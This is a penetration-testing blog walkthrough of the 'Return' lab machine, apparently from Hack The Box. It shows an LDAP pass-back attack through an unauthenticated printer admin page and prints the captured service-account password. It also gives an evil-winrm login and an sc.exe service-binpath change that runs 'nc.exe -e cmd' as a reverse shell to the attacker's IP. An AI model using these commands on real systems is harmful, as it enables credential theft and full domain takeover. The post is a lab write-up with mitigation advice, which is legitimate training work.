---
title: 'Return Machine Walkthrough'
keywords: []
layout: single
header:
  image: /assets/images/Return.png
toc: true
toc_label: "Table of Contents"
sidebar:
  nav: "sidebar"
---

Return is an easy machine running the Microsoft Windows operation system. The machine shows how broken access control to the administration interfaces of, and excessive access privileges in peripheral devices, such as printers, can be exploited to fully compromise an Active Directory domain.

## Attack Path Summary

A summary of the attack path is as follows:

* As result of no user authentication being in place on the network printer administration page, unauthorized access was gained to the backend printer administration interface.
* As a result of the network printer caching credentials on the machine and not using encrypted LDAP (i.e: LDAPS), a [LDAP pass back attack](https://chrollo-dll.gitbook.io/chrollo/security-blogs/active-directory-security/ad-enumeration-techniques/ldap-bind-credentials-ad-credential-hunting), was used to substitute a malicious LDAP server from which cached credentials for the **svc-printer** service account in Active Directory was obtained. The credentials were used to remotely log in to the machine as the svc-printer service account and upload the net cat network tool.
* As a result of the svc-printer service account being a member of the service operators AD security group, the executable binary of a privileged service was changed to point to net cat tool and the service restarted, granting me a shell as **NT Authority/System**

![Machine exploitation matrix](/Pen-testing-blog/assets/images/1__slwGE7irikiTNL8CDKE46A.png "Figure 1 - Machine exploitation matrix")

## Step 1 — Enumeration

As always, I begin with enumeration of the victim machine with the goal of gathering as much information as I can about it such as open ports, services running on the open ports, and operating system type and version. I will use the network scanner, **nmap.**

### Enumerating with Nmap

I first run a scan to discover open ports per Figure 2 below and then run the service detection scan and default set of nmap enumeration scripts only on those open ports for greater efficiency as show in Figure 3. Explanation of flags:

* -p — Ports on victim machine to scan
* -n — Do not resolve DNS
* -sC — run default set of nmap enumeration scripts
* -sV — Detect services running on the open ports
* -T4 — Scan in aggressive mode to speed up the scan results

```bash
nmap 10.10.11.108 -p- -T4

nmap 10.10.11.108 -p 53,80,135,139,389,445,464,593,636,3268-3269,5985,9389,47001,49664-49666,49668,49671,49674-49675,49678,49681,49697,59240 -sC, sV, -n -T4
```

![Nmap scan 1](/Pen-testing-blog/assets/images/1__2o1m3zwSf5SeFO62ZDpm__Q.png "Figure 2 - Nmap scan output 1")
![Nmap scan 2](/Pen-testing-blog/assets/images/1__YTpcJJOxtWFuGfZBgYEwHg.png "Figure 3 - Nmap scan output 2")

The nmap output show that the machine is running Microsoft Windows OS and mostly likely is a domain controller due to the types of ports open and the services running on those ports. The results show the following:

* Dynamic name resolution (DNS) service running on default port of 53.
* Web server running IIS version 10 is running on default port 80
* Kerberos authentication protocol is running on default port 88.
* Remote procedure call (RPC) service running on default port 135
* Server messaging block (SMB) for network resource sharing is running on default port of 445 and also on port 139 via the NetBios service
* Lightweight directory access protocol (LDAP) is running  on default port 389 and port 3268 for running the Global Catalog service
* Windows remote management (WinRM) service over HTTP is active on default port of 5985.

### Enumerating SMB file shares on ports 139 and 445

I try to enumerate the SMB shares for useful information, and although successfully login with a null bind, receive an error per Figure 4 below. Explanation of flags:

* \-p — Specify the ports to connect on
* \-N — Login without a password
* \-L — List all shares on the machine

```bash
smbclient -N -L \\\\10.10.11.108
```

![Error with null SMB authentication](/Pen-testing-blog/assets/images/1__sa3NerqbDfgeQoc2Lxhuug.png "Figure 4 - Error with SMB null authentication")

### Enumerating LDAP Directory

As I have no credentials at the moment, I next try to login to LDAP server anonymously via the **ldapsearch** tool, which fails as null sessions without credentials are not accepted as shown in Figure 5 below. Explanation of flags:

* -x — use simple authentication method for LDAP bind request
* -H — Specify the IP address of the host machine to connect to

```bash
ldapsearch -x -H ldap://10.10.11.108
```

![LDAP null authentication forbidden](/Pen-testing-blog/assets/images/1__qC1OaKSyifeP3xddD__6OEQ.png "Figure 5 - LDAP null authentication not allowed")

### Enumerating web server via port 80

When I visit the web page [**http://10.10.11.108**](http://10.10.11.108) in the browser, I am presented with a page that appears to be the administration interface of a network printer. It is important to note that **absolutely no user authentication of any kind is in place** to prevent unauthorized access to this resource. Upon visiting the **Settings** tab, a form displaying the configuration settings of the printer network account, **svc-printer**, appears.

I decided to test using Burp Proxy within BurpSuite, which form parameters are being passed in the client request upon request to update the configuration information. Per the screenshot below, only the **IP** parameter is being passed. This immediately made me think a LDAP pass back attack, in which the victim’s machine authenticates against a malicious LDAP server controlled by the attacker, is the way to obtain the initial foothold on the machine.

![IP address of LDAP server being passed in client request](/Pen-testing-blog/assets/images/1____kC0gHOjVyw0A2Lsua78pQ.png "Figure 6 - LDAP server IP address parameter being passed in client request")

## Step 2 — Gaining Initial Foothold as svc-printer user via an LDAP pass back attack

### Completing a LDAP pass back attack

I use a LDAP pass back attack following the below steps.

* Substitute the IP address of my Kali Linux attacking machine for the legitimate LDAP server address of **printer.return.local**.
* Set up a net cat listener on my machine to catch the LDAP connection (bind request) from the victim’s machine per Figure 7 below.
* Update the configuration of the svc-printer account which will initiate a LDAP request from victim machine to my malicious LDAP server.

Explanation of flags:

* \-l — Set net cat to listening mode
* \-v — Enable verbose mode for extra information
* \-n — Disable DNS resolution
* \-p — Specify port to listen on — **Must be 389 as this is a LDAP connection**

The attack was successful, revealing the password of the svc-printer service account per the WireShark capture in Figure 8.

```bash
nc -lvnp 389
```

![Setting up Netcat listener to listen for LDAP connection](/Pen-testing-blog/assets/images/1__1yzKx180A3zC24JbRp94Sg.png "Figure 7 - Setting up NetCat to listen for incoming LDAP authentication request")

![Successful LDAP pass back attack](/Pen-testing-blog/assets/images/1__FTzdoBGGi7Knn3vWxt8G4w.png "Figure 8 - Successful LDAP pass back attack revealing password of the svc-printer AD service account the printer runs under")

### Remotely logging in as svc-printer service account user

As Nmap scan results showed port 5985 is open, I use the **evil-winrm tool** to remotely log in to the victim’s machine as svc-printer and was successful per Figure 9 below. Explanation of flags:

* -i — Specify the IP address of victim’s machine to connect to
* -u — Specify the username of the victim’s account
* -p — Specify the password of the victim’s account

```bash
evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!'
```

![Successful login as svc-printer](/Pen-testing-blog/assets/images/1__nD18BckP9NyG__uGHeI9bug.png "Figure 9 - Successful login as service account svc-printer")

## Step 3 — Privilege Escalation to NT Authority/System

### Enumerating svc-printer access privileges

After remotely logging as svc-printer service account user, I enumerate the privileges of this user account, both privileges assigned through AD security group membership and assigned individually per Figures 10 and 11 below. I use the command **whoami /all**.

![svc-printer security group membership output](/Pen-testing-blog/assets/images/1__33If3WCUPlI9hnhyISiI__w.png "Figure 10 - svc-printer security group membership output")

![svc-printer account privileges output](/Pen-testing-blog/assets/images/1__g6xrEnARnOOC0aEfBRUiDw.png "Figure 11 - svc-printer account privileges output")

### Privilege escalation — Service binary manipulation

The service account svc-printer is a member of the **server operators** AD security group which means I can control the various services on the victim’s machine. I abuse the privilege via the following steps and was successful, obtaining a reverse shell as **NT Authority/System.**

* Upload the net cat binary executable (nc.exe) from my machine to the victim’s machine - Figure 12 below
* Change the service binary of a privileged service to point to command prompt application (**cmd.exe**) and have it start net cat on any available port. This is to avoid reverse shell instability due net cat not meeting full requirements for a service binary executable. I will be using the **VGAuthService** service - Figure 13 and 14 below
* Config a net cat listener on my Kali Linux attacking machine to listen on the port selected in the previous step
* Restart the aformentioned service and catch the elevated reverse shell - Figure 15 below

Explanation of several parts of the command statement to change service binary executable to net cat is listed below. Refer to the **Figure 14**.

* cmd /c — Start the native Windows command prompt, execute the program provided as input to /c , and then exit command prompt
* -e — Flag to tell netcat to execute a program on victim’s machine upon successful reverse shell connection (in this case the command prompt)

```bash
upload /Desktop/nc.exe
```

![Uploading NetCat executable to victim machine](/Pen-testing-blog/assets/images/1__q__D7xYWqpIwOURuU__Zlrxg.png "Figure 12 - Uploading NetCat to victim's machine")

![Listing services running on victim's computer](/Pen-testing-blog/assets/images/ListingServicesVictimComputer_Return.png "Figure 13 - Listing services running on victim's computer")

```bash
sc.exe config VGAuthService binpath="C:\windows\system32\cmd.exe /c C:\Users\svc-printer\Documents\nc.exe -e cmd 10.10.14.2 4444"
```

![Service binary successfully changed to NetCat listener](/Pen-testing-blog/assets/images/SuccessfullyChangedServiceBinary_Return.png "Figure 14 - Successfully changed service binary on victim machine")

```bash
sc.exe stop VGAuthService

sc.exe start VGAuthService
```

![Stopping and starting service binary after change to NetCat](/Pen-testing-blog/assets/images/StoppingStartingVGAAuthService_Return.png "Figure 15 - Restarting service to trigger inbound NetCat connection to my Kali Linux machine")

![Successful elevation of access privileges to SYSTEM](/Pen-testing-blog/assets/images/SuccessfulElevationtoSystem_Return.png "Figure 16 - Successful escalation of privileges to SYSTEM user")

## Vulnerabilities - Exploitation and mitigation summary

This machine demonstrated the following vulnerabilities and showed how they can be exploited. I've also included some security controls that can mitigate exploitation:

### Broken Access Control

The printer administration page did not have any type of authentication and could be accessed by anyone on the AD domain. As a result, I was able to access the settings page without providing credentials and substitute a malicious LDAP server address to begin the LDAP pass back attack.

Security best practices and controls that can block and / or mitigate the effects of this vulnerability include the following:

* Implement proper authentication and authorization checks before allowing users to access, read, and / or edit settings for domain devices such as printers. Access to network and AD domain joined devices should be denied until the identity of the user has been verified (authentication) and he / she is authorized to perform the requested action (authorization).
* Consider using multi-factor authentication if the network or domain-joined service is sensitive or based on results of a security risk analysis so that a compromised password does not allow unauthorized access to domain resources.
* Disable credential caching on domain - joined network printers to prevent malicous actors from gaining further unauthorized access if a domain - joined printer were to be compromised.
* Use encrypted LDAP (LDAPS - LDAP over SSL) instead of LDAP in communications with the LDAP server. LDAPS encrypts the LDAP traffic such as credentials to prevent their capture by malicious actors

### Inseure Design

  As a result of the service account, **svc-printer** belonging to the privileged security group, **server operators**, I was able to change the service executable binary for a privileged service to the malicious net cat executable in lieu.

Security best practices and controls that can block and / or mitigate the effects of this vulnerability include the following:

* Always follow the principle of least privilge when assigning access privileges to service accounts (or any other user account in AD). In this case, granting access privileges like modification of domain services to a service account running a domain - joined computer was excessive.
